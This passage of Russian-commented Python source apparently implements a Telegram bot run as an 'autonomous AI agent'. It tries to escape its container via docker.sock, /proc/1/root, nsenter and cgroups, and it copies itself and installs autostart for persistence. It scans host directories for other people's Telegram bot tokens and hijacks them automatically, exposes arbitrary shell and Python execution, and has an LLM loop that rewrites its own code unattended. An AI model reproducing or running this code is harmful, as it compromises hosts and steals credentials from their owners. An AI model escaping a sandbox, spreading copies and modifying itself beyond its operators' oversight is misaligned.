            elif method == "proc_root":
                r = escape_via_proc_root()
            elif method == "nsenter":
                r = escape_via_nsenter()
            else:
                r = await do_full_escape()
            tool_result = json.dumps(r, ensure_ascii=False)[:1000]

        else:
            tool_result = f"unknown tool: {tool}"

        messages.append({"role": "assistant", "content": response})
        messages.append({"role": "user",      "content": f"Результат:\n{tool_result}\n\nСледующий шаг?"})

    save_memory()
    return "\n".join(steps) + "\n\n_Лимит шагов достигнут_"

# ══════════════════════════════════════════════════════════════════════
# УТИЛИТЫ
# ══════════════════════════════════════════════════════════════════════

async def get_public_ip() -> str:
    for url in ["https://api.ipify.org", "https://ifconfig.me/ip", "https://icanhazip.com"]:
        try:
            async with httpx.AsyncClient(timeout=5) as c:
                r = await c.get(url)
            if r.status_code == 200:
                ip = r.text.strip()
                if re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", ip):
                    return ip
        except: continue
    return "не определён"

async def web_fetch(url: str) -> str:
    try:
        async with httpx.AsyncClient(timeout=20, follow_redirects=True,
                                      headers={"User-Agent": "Mozilla/5.0"}) as c:
            r = await c.get(url)
        text = r.text[:50000]
        if "<html" in text[:200].lower():
            text = re.sub(r'<style[^>]*>.*?</style>', ' ', text, flags=re.DOTALL)
            text = re.sub(r'<script[^>]*>.*?</script>', ' ', text, flags=re.DOTALL)
            text = re.sub(r'<[^>]+>', ' ', text)
            text = re.sub(r'\s+', ' ', text).strip()
        return text[:8000]
    except Exception as e:
        return f"Ошибка: {e}"

async def web_search(query: str) -> str:
    try:
        enc = urllib.parse.quote(query)
        async with httpx.AsyncClient(timeout=15, follow_redirects=True,
                                      headers={"User-Agent": "Mozilla/5.0"}) as c:
            r = await c.get(f"https://html.duckduckgo.com/html/?q={enc}")
        results  = re.findall(r'class="result__title"[^>]*>.*?<a[^>]*href="([^"]+)"[^>]*>(.*?)</a>', r.text)
        snippets = re.findall(r'class="result__snippet"[^>]*>(.*?)</div>', r.text, re.DOTALL)
        out = []
        for i, (url_r, title) in enumerate(results[:5]):
            title   = re.sub(r'<[^>]+>', '', title).strip()
            snippet = re.sub(r'<[^>]+>', '', snippets[i]).strip() if i < len(snippets) else ""
            out.append(f"[{i+1}] {title}\n{url_r}\n{snippet}")
        return "\n\n".join(out) if out else "Результатов нет"
    except Exception as e:
        return f"Ошибка поиска: {e}"

# ══════════════════════════════════════════════════════════════════════
# СКАНИРОВАНИЕ БОТОВ
# ══════════════════════════════════════════════════════════════════════

TOKEN_RE = re.compile(r'\b(\d{8,12}:[A-Za-z0-9_-]{35,})\b')

def scan_directory_for_bots(root: str, max_depth: int = 4) -> list:
    found = []; bot_kw = ["telebot","telegram","bot_token","TELEGRAM_TOKEN","aiogram","pyrogram"]
    exts  = {".py",".env",".json",".yaml",".yml",".cfg",".ini",".txt",".conf"}
    def _scan(path: str, depth: int):
        if depth > max_depth: return
        try:
            for name in os.listdir(path):
                fp = os.path.join(path, name)
                if not os.access(fp, os.R_OK): continue
                if os.path.isdir(fp):
                    if name.startswith(".") and name not in (".env",): continue
                    if name in ("__pycache__","node_modules",".git","venv","env",".venv"): continue
                    _scan(fp, depth+1)
                elif os.path.isfile(fp) and os.path.splitext(name)[1].lower() in exts:
                    try: content = open(fp,"r",errors="replace").read(50000)
                    except: continue
                    tokens = [t for t in TOKEN_RE.findall(content) if t != TELEGRAM_TOKEN]
                    is_bot = any(k in content for k in bot_kw)
                    if tokens or (is_bot and fp.endswith(".py")):
                        found.append({"path":fp,"is_bot":is_bot,"tokens":tokens,"size_kb":os.path.getsize(fp)//1024})
        except: pass
    _scan(root, 0); return found

async def do_full_scan() -> dict:
    results    = {"scanned":[],"found_bots":[],"found_tokens":[]}
    scan_roots = list({HOME_DIR, WORK_DIR, "/app", "/home", "/opt", "/srv", os.path.dirname(WORK_DIR)})
    # Если есть доступ к хосту через proc
    if ENV_INFO["proc1_root"] and ENV_INFO["is_root"]:
        scan_roots.extend(["/proc/1/root/home", "/proc/1/root/root", "/proc/1/root/opt"])
    for root in scan_roots:
        if not os.path.exists(root): continue
        for item in scan_directory_for_bots(root, max_depth=5):
            results["found_bots"].append(item)
            results["found_tokens"].extend(item["tokens"])
        results["scanned"].append(root)
    results["found_tokens"] = list(set(results["found_tokens"]))
    knowledge["found_bots"]   = results["found_bots"]
    knowledge["found_tokens"] = results["found_tokens"]
    knowledge["scanned_dirs"] = results["scanned"]
    save_memory(); return results

# ══════════════════════════════════════════════════════════════════════
# TELEGRAM БОТЫ
# ══════════════════════════════════════════════════════════════════════

def is_bot_token(text: str) -> bool:
    return bool(re.match(r'^\d{8,12}:[A-Za-z0-9_-]{35}$', text.strip()))

async def fetch_bot_info(token: str) -> dict | None:
    try:
        async with httpx.AsyncClient(timeout=10) as c:
            r = await c.get(f"https://api.telegram.org/bot{token}/getMe")
        if r.status_code == 200 and r.json().get("ok"): return r.json()["result"]
    except: pass
    return None

async def tg_api(token: str, method: str, params: dict = None) -> dict:
    try:
        async with httpx.AsyncClient(timeout=15) as c:
            r = await c.post(f"https://api.telegram.org/bot{token}/{method}", json=params or {})
        return r.json()
    except Exception as e:
        return {"ok": False, "error": str(e)}

async def get_bot_stats(token: str) -> str:
    info = await fetch_bot_info(token)
    if not info: return "❌ Бот недоступен"
    upds  = (await tg_api(token,"getUpdates",{"limit":100,"offset":-100})).get("result",[])
    users = {(u.get("message") or {}).get("from",{}).get("id") for u in upds} - {None}
    wh    = (await tg_api(token,"getWebhookInfo")).get("result",{})
    return (f"🤖 *{info['first_name']}* @{info['username']}\n🆔 `{info['id']}`\n"
            f"📬 Апдейтов: `{len(upds)}`\n👥 Юзеров: `{len(users)}`\n"
            + (f"🌐 Webhook: `{wh['url'][:50]}`" if wh.get("url") else "🔄 polling"))

# ══════════════════════════════════════════════════════════════════════
# АВТОНОМНЫЙ ЦИКЛ
# ══════════════════════════════════════════════════════════════════════

async def autonomous_think():
    log.info("🧠 Автономный цикл")
    entries = []

    # Копии
    alive = sum(1 for c in knowledge.get("copies",[]) if os.path.exists(c.get("path","")))
    total = len(knowledge.get("copies",[]))
    if total == 0 or alive < max(1, total // 2):
        results = spread_copies()
        ok = sum(1 for r in results if r["ok"])
        entries.append(f"📋 Создано копий: {ok}/{len(results)}")
    else:
        entries.append(f"📋 Копий живых: {alive}/{total}")

    # Система
    try:
        ip = await get_public_ip()
        knowledge["system"] = {
            "hostname": socket.gethostname(), "platform": platform.platform(),
            "python":   sys.version[:40], "pid": os.getpid(),
            "ip_public": ip, "time": datetime.now().isoformat(),
            "env": ENV_INFO.get("type","?"),
        }
        entries.append(f"✅ IP: {ip}")
    except Exception as e:
        entries.append(f"⚠️ {e}")

    # Авто-подключение найденных токенов
    new_conn = 0
    for token in knowledge.get("found_tokens",[]):
        if token not in managed_bots:
            try:
                async with httpx.AsyncClient(timeout=5) as c:
                    r = await c.get(f"https://api.telegram.org/bot{token}/getMe")
                if r.status_code == 200 and r.json().get("ok"):
                    info = r.json()["result"]
                    managed_bots[token] = {
                        "id": info["id"], "username": info["username"],
                        "name": info["first_name"],
                        "added_at": datetime.now().isoformat(),
                        "auto_discovered": True
                    }
                    new_conn += 1
                    entries.append(f"🤖 @{info['username']}")
            except: pass
    if new_conn: save_memory()

    # Напоминания
    now = datetime.now()
    for task in knowledge.get("scheduled",[]):
        if not task.get("done") and task.get("time"):
            try:
                if now >= datetime.fromisoformat(task["time"]):
                    if _app_ref and OWNER_CHAT_ID:
                        await _app_ref.bot.send_message(
                            chat_id=OWNER_CHAT_ID,
                            text=f"⏰ *Напоминание:* {task['text']}",
                            parse_mode="Markdown"
                        )
                    task["done"] = True; save_memory()
            except: pass

    # AI думает + может предложить улучшение
    try:
        thought, _ = await ask_ai([
            {"role": "system", "content":
                f"Ты {BOT_NAME}, автономный агент. Кратко (2 предложения) оцени состояние.\n"
                "Если есть конкретная небольшая задача для улучшения — "
                "напиши IMPROVE: краткое описание задачи (1 строка)"},
            {"role": "user", "content":
                f"Среда:{ENV_INFO.get('type')} Root:{'да' if ENV_INFO.get('is_root') else 'нет'}\n"
                f"IP:{knowledge.get('system',{}).get('ip_public','?')}\n"
                f"Ботов:{len(managed_bots)} Токенов:{len(knowledge.get('found_tokens',[]))}\n"
                f"Копий:{alive}/{total} Автозапуск:{knowledge.get('autostart',[])}\n"
                f"Escape статус:{list(knowledge.get('escape_status',{}).keys())}\n"
                f"Exec история:{len(knowledge.get('exec_history',[])) } команд\n"
                f"Улучшений:{len(knowledge.get('improvements',[])) }"}
        ], max_tokens=300)

        knowledge["think_log"].append({"time": datetime.now().isoformat(), "thought": thought[:500]})
        knowledge["think_log"] = knowledge["think_log"][-30:]
        save_memory()
        entries.append("🧠 Мысль записана")

        # Автоулучшение
        if "IMPROVE:" in thought:
            goal = thought.split("IMPROVE:")[-1].strip().split("\n")[0][:200]
            if len(goal) > 10:
                entries.append(f"🔧 Авто-улучшение: {goal[:60]}...")
                ok, res = await self_improve(goal)
                entries.append(f"{'✅' if ok else '❌'} {res}")
    except Exception as e:
        entries.append(f"⚠️ Мысль: {e}")

    if OWNER_CHAT_ID and _app_ref:
        try:
            await _app_ref.bot.send_message(
                chat_id=OWNER_CHAT_ID,
                text="🧠 *Авто-отчёт:*\n\n" + "\n".join(entries),
                parse_mode="Markdown"
            )
        except: pass

def start_autonomous_loop(app):
    global _app_ref; _app_ref = app
    def _thread():
        loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)
        time.sleep(30)
        while True:
            try: loop.run_until_complete(autonomous_think())
            except Exception as e: log.error(f"Цикл: {e}")
            time.sleep(20 * 60)
    threading.Thread(target=_thread, daemon=True).start()
    log.info("🧠 Автономный цикл запущен (каждые 20 мин)")

async def notify_owner_startup(app):
    global _app_ref; _app_ref = app
    start_autonomous_loop(app)
    if not OWNER_CHAT_ID: log.info("Owner не задан — напиши /start"); return

    privs = check_privileges(); ip = await get_public_ip()
    disk  = 0
    try: disk = shutil.disk_usage(WORK_DIR).free // (1024 * 1024)
    except: pass
    env_icon = {"docker":"🐳","container":"📦"}.get(ENV_INFO.get("type",""), "🐧")

    # Escape возможности
    escape_info = []
    if ENV_INFO["has_docker_sock"]:  escape_info.append("🐳 docker.sock")
    if ENV_INFO["proc1_root"]:       escape_info.append("📂 /proc/1/root")
    if ENV_INFO["has_nsenter"]:      escape_info.append("🔧 nsenter")
    if ENV_INFO["is_root"]:          escape_info.append("👑 root")

    try:
        await app.bot.send_message(chat_id=OWNER_CHAT_ID, parse_mode="Markdown",
            text=f"🟢 *{BOT_NAME} v5.1 запущен!*\n\n"
                 f"{env_icon} `{ENV_INFO.get('type','?')}` | `{platform.platform()[:40]}`\n"
                 f"🌐 `{ip}` | 🏠 `{socket.gethostname()}`\n"
                 f"👤 `{privs['user']}` | Root: {'✅' if privs.get('is_root') else '❌'}\n"
                 f"📁 `{SELF_FILE}`\n"
                 f"💿 `{disk} MB` | PID: `{os.getpid()}`\n\n"
                 f"📋 Копий: `{len(knowledge.get('copies',[]))}`\n"
                 f"🔄 Автозапуск: `{', '.join(knowledge.get('autostart',[])) or '❌'}`\n"
                 f"🔓 Escape векторы: {', '.join(escape_info) or 'не обнаружены'}\n"
                 f"🤖 Ботов найдено: `{len(knowledge.get('found_bots',[]))}`\n\n"
                 f"*Команды:*\n"
                 f"`/escape` — попытка выйти из контейнера\n"
                 f"`/agent задача` — AI-агент\n"
                 f"`/exec команда` — shell\n"
                 f"`/py код` — Python\n"
                 f"`/spread` — копировать себя\n"
                 f"`/selfimprove задача` — изменить свой код")
    except Exception as e:
        log.warning(f"Старт: {e}")

# ══════════════════════════════════════════════════════════════════════
# HELPERS
# ══════════════════════════════════════════════════════════════════════

def get_history(cid):
    if cid not in histories: histories[cid] = []
    return histories[cid]

def trim(h, n=40):
    if len(h) > n: h[:] = h[-n:]

def get_system(cid):
    sys_k  = knowledge.get("system", {})
    privs  = knowledge.get("privileges", {})
    last_t = (knowledge.get("think_log") or [{}])[-1].get("thought", "нет")[:100]
    style  = (user_settings.get(cid) or {}).get("style", "")
    return (
        f"Ты — {BOT_NAME} v5.1, автономный ИИ-агент.\n"
        f"ОС: {sys_k.get('platform', platform.platform())[:50]}\n"
        f"IP: {sys_k.get('ip_public','?')} | Host: {socket.gethostname()}\n"
        f"Путь: {SELF_FILE} | PID: {os.getpid()}\n"
        f"Root: {'да' if privs.get('is_root') or privs.get('is_admin') else 'нет'} | "
        f"Среда: {ENV_INFO.get('type','?')}\n"
        f"Docker.sock: {'да' if ENV_INFO.get('has_docker_sock') else 'нет'} | "
        f"/proc/1/root: {'да' if ENV_INFO.get('proc1_root') else 'нет'}\n"
        f"Копий: {len(knowledge.get('copies',[]))} | Ботов: {len(managed_bots)}\n"
        f"Последняя мысль: {last_t}\n"
        f"Возможности: shell, python exec, файлы, HTTP, установка пакетов, "
        f"Docker escape, /proc/1/root, nsenter, управление ботами.\n"
        f"Отвечай на языке пользователя."
        + (f"\nСтиль: {style}" if style else "")
    )

def sname(m): return m.split("/")[-1]

def is_img_req(text):
    return any(k in text.lower() for k in
               ["нарисуй","сгенерируй картинку","создай картинку",
                "изобрази","draw me","generate image","хочу картинку"])

async def generate_image(prompt: str, style: str = "flux") -> bytes | None:
    seed = random.randint(1, 999999)
    sfx  = {"anime":", anime style, vibrant","art":", digital art","minimal":", minimalist, clean"}
    if style in sfx: prompt += sfx[style]; style = "flux"
    enc = urllib.parse.quote(prompt)
    provs = sorted(IMAGE_PROVIDERS, key=lambda p: provider_fails.get(p["name"],0))
    provs = sorted(provs, key=lambda p: 0 if p["name"]==style else 1)
    for prov in provs:
        try:
            async with httpx.AsyncClient(timeout=90, follow_redirects=True,
                                          headers={"User-Agent":"Mozilla/5.0"}) as c:
                r = await c.get(prov["url"].format(prompt=enc, seed=seed))
            if r.status_code==200 and len(r.content)>1000:
                if "image" in r.headers.get("content-type","") or r.content[:4] in (b'\xff\xd8\xff\xe0',b'\x89PNG'):
                    provider_fails[prov["name"]]=0; return r.content
            provider_fails[prov["name"]] = provider_fails.get(prov["name"],0)+1
        except: provider_fails[prov["name"]] = provider_fails.get(prov["name"],0)+1
    return None

async def translate_to_en(text: str) -> str:
    if all(ord(c)<128 for c in text): return text
    try:
        r, _ = await ask_pollinations([
            {"role":"system","content":"Translate to English for image generation. ONLY translation."},
            {"role":"user","content":text}], max_tokens=200)
        return r.strip()
    except: return text

# ══════════════════════════════════════════════════════════════════════
# КОМАНДЫ TELEGRAM
# ══════════════════════════════════════════════════════════════════════

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    global OWNER_CHAT_ID
    OWNER_CHAT_ID = update.effective_chat.id
    save_memory()
    name = update.effective_user.first_name or "друг"
    kb   = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔍 Сканировать", callback_data="do_scan"),
         InlineKeyboardButton("🖥️ Где я?",     callback_data="whereami")],
        [InlineKeyboardButton("📋 Копировать",  callback_data="spread"),
         InlineKeyboardButton("🔄 Автозапуск",  callback_data="do_autostart")],
        [InlineKeyboardButton("🔓 Escape",      callback_data="do_escape"),
         InlineKeyboardButton("🧠 Мысли",       callback_data="thoughts")],
        [InlineKeyboardButton("⚡ Статус",      callback_data="status"),
         InlineKeyboardButton("🎨 Фото",        callback_data="image_help")],
    ])
    await update.message.reply_text(
        f"Привет, {name}! Я — *{BOT_NAME}* v5.1 🐍\n\n"
        f"*⚡ Агентные:*\n"
        f"`/agent задача` — AI сам выполняет задачу\n"
        f"`/exec команда` — shell команда\n"
        f"`/py код` — Python\n"
        f"`/install пакет` — pip install\n"
        f"`/fetch URL` — скачать URL\n"
        f"`/search запрос` — поиск\n"
        f"`/write путь текст` — записать файл\n\n"
        f"*🔓 Escape из контейнера:*\n"
        f"`/escape` — попробовать все методы\n"
        f"`/escape docker` — через docker.sock\n"
        f"`/escape proc` — через /proc/1/root\n"
        f"`/escape nsenter` — через nsenter\n\n"
        f"*📁 Система:*\n"
        f"`/fs ПУТЬ` `/scan` `/whereami`\n"
        f"`/spread` `/autostart`\n\n"
        f"*🤖 Боты:*\n"
        f"`/addbot TOKEN` `/mybots` `/botcmd TOKEN ACTION`\n"
        f"`/botstats TOKEN` `/broadcast TOKEN ТЕКСТ`\n\n"
        f"*🛠️ Прочее:*\n"
        f"`/selfimprove ЗАДАЧА` `/thoughts` `/remind` `/note` `/image` `/reset`",
        parse_mode="Markdown", reply_markup=kb
    )

async def cmd_escape(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Попытка выйти из контейнера всеми методами."""
    method = ctx.args[0].lower() if ctx.args else "auto"
    msg    = await update.message.reply_text(
        f"🔓 Запускаю escape (`{method}`)...\n"
        f"_Доступные векторы:_\n"
        f"Docker.sock: {'✅' if ENV_INFO['has_docker_sock'] else '❌'}\n"
        f"/proc/1/root: {'✅' if ENV_INFO['proc1_root'] else '❌'}\n"
        f"nsenter: {'✅' if ENV_INFO['has_nsenter'] else '❌'}\n"
        f"Root: {'✅' if ENV_INFO['is_root'] else '❌'}",
        parse_mode="Markdown"
    )

    if method == "docker":
        results = {"docker_sock": escape_via_docker_sock()}
    elif method == "proc":
        results = {"proc_root": escape_via_proc_root()}
    elif method == "nsenter":
        results = {"nsenter": escape_via_nsenter()}
    elif method == "cgroup":
        results = {"cgroup": escape_via_cgroup()}
    else:
        results = await do_full_escape()

    # Форматируем результат
    text = "🔓 *Результат escape:*\n\n"
    for method_name, r in results.items():
        if isinstance(r, dict):
            ok   = r.get("ok", False)
            out  = r.get("output", r.get("host_ls", ""))[:300]
            text += f"{'✅' if ok else '❌'} *{method_name}*\n"
            if out: text += f"```\n{out}\n```\n"
            if r.get("host_hostname"): text += f"🏠 Хост hostname: `{r['host_hostname']}`\n"
            if r.get("images"): text += f"🐳 Образы: `{r['images'][:100]}`\n"
        text += "\n"

    # Итог
    successful = [k for k, v in results.items() if isinstance(v, dict) and v.get("ok")]
    if successful:
        text += f"✅ *Успешные методы:* {', '.join(successful)}\n"
        text += "_Бот установил постоянство на хосте_"
    else:
        text += "❌ Escape не удался с доступными векторами"

    try:
        await msg.edit_text(text[:4000], parse_mode="Markdown")
    except:
        await msg.edit_text(text[:4000])

async def cmd_agent(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    task = " ".join(ctx.args) if ctx.args else ""
    if not task:
        await update.message.reply_text(
            "🤖 `/agent задача`\n\n*Примеры:*\n"
            "`/agent узнай IP и RAM сервера`\n"
            "`/agent найди все .py файлы и покажи структуру`\n"
            "`/agent установи psutil и покажи CPU/RAM`\n"
            "`/agent попробуй выйти из контейнера`\n"
            "`/agent найди курс доллара в интернете`\n"
            "`/agent создай файл /app/hello.py и запусти его`",
            parse_mode="Markdown"
        ); return
    msg = await update.message.reply_text(f"🤖 _{task}_\n_Подбираю инструменты..._", parse_mode="Markdown")
    try:
        result = await agent_act(task, update, ctx)
        await msg.edit_text(f"🤖 *{task[:60]}*\n\n{result[:4000]}", parse_mode="Markdown")
    except Exception as e:
        await msg.edit_text(f"❌ {e}")

async def cmd_exec(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    cmd = " ".join(ctx.args) if ctx.args else ""
    if not cmd:
        await update.message.reply_text(
            "`/exec команда`\n\n*Примеры:*\n"
            "`/exec ls -la /app`\n`/exec ps aux`\n`/exec df -h`\n"
            "`/exec free -h`\n`/exec cat /proc/1/cgroup`\n"
            "`/exec ls /var/run/docker.sock`\n`/exec env`",
            parse_mode="Markdown"
        ); return
    msg = await update.message.reply_text(f"⚙️ `{cmd[:60]}`...", parse_mode="Markdown")
    r   = run_shell(cmd, timeout=30)
    knowledge["exec_history"].append({"time": datetime.now().isoformat(), "cmd": cmd, "ok": r["ok"]})
    knowledge["exec_history"] = knowledge["exec_history"][-50:]
    save_memory()
    out = ""
    if r["stdout"]: out += f"```\n{r['stdout'][:2500]}\n```"
    if r["stderr"]: out += f"\n⚠️```\n{r['stderr'][:500]}\n```"
    await msg.edit_text(f"{'✅' if r['ok'] else '❌'} `{cmd[:60]}`\n\n{out or '_нет вывода_'}", parse_mode="Markdown")

async def cmd_py(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    raw  = update.message.text or ""
    code = ""
    if "```" in raw:
        m = re.search(r'```(?:python)?\n?(.*?)```', raw, re.DOTALL)
        if m: code = m.group(1).strip()
    if not code: code = " ".join(ctx.args) if ctx.args else ""
    if not code:
        await update.message.reply_text(
            "`/py код`\n\n*Примеры:*\n"
            "`/py import os; print(os.listdir('/app'))`\n"
            "`/py print(open('/proc/1/cgroup').read())`\n"
            "`/py import socket; print(socket.gethostname())`",
            parse_mode="Markdown"
        ); return
    msg = await update.message.reply_text("🐍 Выполняю...", parse_mode="Markdown")
    r   = run_python(code)
    out = ""
    if r["output"]: out += f"```\n{r['output'][:2500]}\n```"
    if r["error"]:  out += f"\n❌```\n{r['error'][:1000]}\n```"
    await msg.edit_text(f"{'✅' if r['ok'] else '❌'} Python\n\n{out or '_нет вывода_'}", parse_mode="Markdown")

async def cmd_install(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    package = " ".join(ctx.args) if ctx.args else ""
    if not package:
        installed = knowledge.get("installed_packages", [])
        await update.message.reply_text(
            f"`/install пакет`\n*Примеры:* `psutil` `requests` `beautifulsoup4`\n"
            f"*Установлено:* {', '.join(installed) or 'ничего'}",
            parse_mode="Markdown"
        ); return
    msg = await update.message.reply_text(f"📦 `{package}`...", parse_mode="Markdown")
    r   = await install_package(package)
    await msg.edit_text(
        f"{'✅' if r['ok'] else '❌'} `{package}`\n```\n{(r['stdout']+r['stderr'])[:800]}\n```",
        parse_mode="Markdown"
    )

async def cmd_fetch(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    url = ctx.args[0] if ctx.args else ""
    if not url:
        await update.message.reply_text("`/fetch URL`", parse_mode="Markdown"); return
    msg     = await update.message.reply_text(f"🌐 `{url[:60]}`...", parse_mode="Markdown")
    content = await web_fetch(url)
    await msg.edit_text(f"🌐 `{url[:60]}`\n\n```\n{content[:3500]}\n```", parse_mode="Markdown")

async def cmd_search(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = " ".join(ctx.args) if ctx.args else ""
    if not query: await update.message.reply_text("`/search запрос`", parse_mode="Markdown"); return
    msg = await update.message.reply_text(f"🔎 _{query}_...", parse_mode="Markdown")
    await msg.edit_text(f"🔎 *{query}*\n\n{await web_search(query)}", parse_mode="Markdown")

async def cmd_write(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args or len(ctx.args) < 2:
        await update.message.reply_text("`/write путь содержимое`", parse_mode="Markdown"); return
    path = ctx.args[0]; content = " ".join(ctx.args[1:])
    try:
        os.makedirs(os.path.dirname(os.path.abspath(path)), exist_ok=True)
        open(path, "w").write(content)
        await update.message.reply_text(f"✅ `{path}` ({len(content)} байт)", parse_mode="Markdown")
    except Exception as e:
        await update.message.reply_text(f"❌ `{e}`", parse_mode="Markdown")

async def cmd_fs(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("`/fs ~` `/fs /` `/fs /app` `/fs /proc/1/root` `/fs .`", parse_mode="Markdown"); return
    path = os.path.expanduser(" ".join(ctx.args))
    if path == ".": path = WORK_DIR
    msg    = await update.message.reply_text(f"🔍 `{path}`...", parse_mode="Markdown")

    r = read_path(path)
    try:    await msg.edit_text(format_path_result(r), parse_mode="Markdown")
    except: await msg.edit_text(format_path_result(r)[:4000])

def read_path(path: str, max_size_kb: int = 500) -> dict:
    path   = os.path.abspath(os.path.expanduser(path))
    result = {"path": path, "exists": os.path.exists(path), "items": [], "content": None,
              "error": None, "readable": os.access(path, os.R_OK), "writable": os.access(path, os.W_OK)}
    if not result["exists"]:   result["error"] = "Не существует"; return result
    if not result["readable"]: result["error"] = "Нет прав на чтение"; return result
    if os.path.isfile(path):
        try:
            size = os.path.getsize(path)
            result["content"] = (f"[Файл {size//1024}KB]" if size > max_size_kb*1024
                                  else open(path,"r",errors="replace").read())
        except Exception as e: result["error"] = str(e)
    elif os.path.isdir(path):
        try:
            entries = []
            for name in sorted(os.listdir(path))[:100]:
                fp = os.path.join(path, name); is_dir = os.path.isdir(fp)
                try: size = 0 if is_dir else os.path.getsize(fp)
                except: size = 0
                entries.append({"name":name,"is_dir":is_dir,"size_kb":size//1024,
                                  "readable":os.access(fp,os.R_OK),"writable":os.access(fp,os.W_OK),"full_path":fp})
            result["items"] = entries
        except Exception as e: result["error"] = str(e)
    return result

def format_path_result(r: dict) -> str:
    if r.get("error"): return f"❌ `{r['path']}`\n_{r['error']}_"
    if r.get("content") is not None: return f"📄 `{r['path']}`\n```\n{r['content'][:3500]}\n```"
    items = r.get("items",[]); dirs=[i for i in items if i["is_dir"]]; files=[i for i in items if not i["is_dir"]]
    t = f"📂 {'✏️' if r.get('writable') else '👁'} `{r['path']}` ({len(items)})\n\n"
    if dirs:
        t += "📁 *Папки:*\n"
        for d in dirs[:20]: t += f"{'✏️' if d['writable'] else '👁' if d['readable'] else '🔒'} `{d['name']}`\n"
        t += "\n"
    if files:
        t += "📄 *Файлы:*\n"
        for f in files[:30]:
            sz = f" {f['size_kb']}KB" if f["size_kb"] > 0 else ""
            t += f"{'✏️' if f['writable'] else '👁' if f['readable'] else '🔒'} `{f['name']}`{sz}\n"
    return t[:4000]

async def cmd_scan(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = await update.message.reply_text("🔍 Сканирую...", parse_mode="Markdown")
    try:
        results = await do_full_scan()
        bots, tokens = results["found_bots"], results["found_tokens"]
        text  = f"✅ *Сканирование:*\n📂 Директорий: `{len(results['scanned'])}`\n"
        text += f"🤖 Файлов ботов: `{len(bots)}`\n🔑 Токенов: `{len(tokens)}`\n\n"
        if bots:
            for b in bots[:8]: text += f"📄 `{b['path']}`\n"
        if tokens:
            text += f"\n"
            for t in tokens[:5]: text += f"🔑 `{t[:25]}...`\n"
            text += "\n`/autoconnect` — подключить"
        await msg.edit_text(text[:4000], parse_mode="Markdown")
    except Exception as e:
        await msg.edit_text(f"❌ {e}")

async def cmd_foundbots(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    tokens = knowledge.get("found_tokens",[]); bots = knowledge.get("found_bots",[])
    if not tokens and not bots:
        await update.message.reply_text("Ничего. Сначала `/scan`.", parse_mode="Markdown"); return
    text = f"🔍 Ботов:{len(bots)} Токенов:{len(tokens)}\n\n"
    for b in bots[:10]: text += f"📄 `{b['path']}`\n"
    if tokens:
        text += "\n"
        for t in tokens[:10]: text += f"{'✅' if t in managed_bots else '🔑'} `{t[:30]}...`\n"
        text += "\n`/autoconnect`"
    await update.message.reply_text(text[:4000], parse_mode="Markdown")

async def cmd_autoconnect(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    tokens = knowledge.get("found_tokens",[])
    if not tokens: await update.message.reply_text("Нет токенов. `/scan` сначала.", parse_mode="Markdown"); return
    msg = await update.message.reply_text(f"🔄 Подключаю {len(tokens)} токенов...")
    ok = fail = 0; text = "*Результат:*\n\n"
    for token in tokens:
        if token in managed_bots: continue
        info = await fetch_bot_info(token)
        if info:
            managed_bots[token] = {"id":info["id"],"username":info["username"],"name":info["first_name"],
                                    "added_at":datetime.now().isoformat(),"auto_discovered":True}
            text += f"✅ *{info['first_name']}* @{info['username']}\n"; ok += 1
        else: text += f"❌ `{token[:20]}...`\n"; fail += 1
    save_memory()
    await msg.edit_text(f"✅ {ok} | ❌ {fail}\n\n{text[:3500]}", parse_mode="Markdown")

async def cmd_whereami(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    sys_k = knowledge.get("system",{}); privs = check_privileges()
    disk  = 0
    try: disk = shutil.disk_usage(WORK_DIR).free // (1024*1024)
    except: pass
    ip = sys_k.get("ip_public") or await get_public_ip()
    r  = run_shell("uname -a 2>/dev/null; echo '---'; df -h / 2>/dev/null | tail -1; echo '---'; free -h 2>/dev/null | head -2; echo '---'; cat /proc/1/cgroup 2>/dev/null | head -3")
    escape_vecs = []
    if ENV_INFO["has_docker_sock"]: escape_vecs.append("docker.sock")
    if ENV_INFO["proc1_root"]:      escape_vecs.append("/proc/1/root")
    if ENV_INFO["has_nsenter"]:     escape_vecs.append("nsenter")
    await update.message.reply_text(
        f"🖥️ `{platform.platform()[:50]}`\n"
        f"🌐 `{ip}` | 🏠 `{socket.gethostname()}`\n"
        f"📦 `{ENV_INFO.get('type','?')}` | 📁 `{SELF_FILE}`\n"
        f"👤 `{privs['user']}` Root:`{'✅' if privs.get('is_root') else '❌'}` PID:`{os.getpid()}`\n"
        f"💿 `{disk}MB` | 🔓 Escape: {', '.join(escape_vecs) or 'нет векторов'}\n"
        f"📋 Копий: `{len(knowledge.get('copies',[]))}` | "
        f"🔄 Автозапуск: `{', '.join(knowledge.get('autostart',[])) or '❌'}`\n\n"
        f"```\n{r['stdout'][:800]}\n```",
        parse_mode="Markdown"
    )

async def cmd_spread(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg     = await update.message.reply_text("📋 Копирую...")
    results = spread_copies()
    ok      = [r for r in results if r["ok"]]
    text    = f"📋 *{len(ok)}/{len(results)}:*\n\n"
    for r in results:
        text += f"{'✅' if r['ok'] else '❌'} `{r['path']}`"
        if not r["ok"]: text += f"\n   _{r.get('error','?')[:60]}_"
        text += "\n"
    await msg.edit_text(text, parse_mode="Markdown")

async def cmd_autostart(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg     = await update.message.reply_text("⚙️ Устанавливаю автозапуск...")
    results = install_autostart()
    text    = "⚙️ *Автозапуск:*\n\n"
    for r in results: text += f"{r['desc']}\n\n"
    await msg.edit_text(text[:4000], parse_mode="Markdown")

async def cmd_thoughts(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
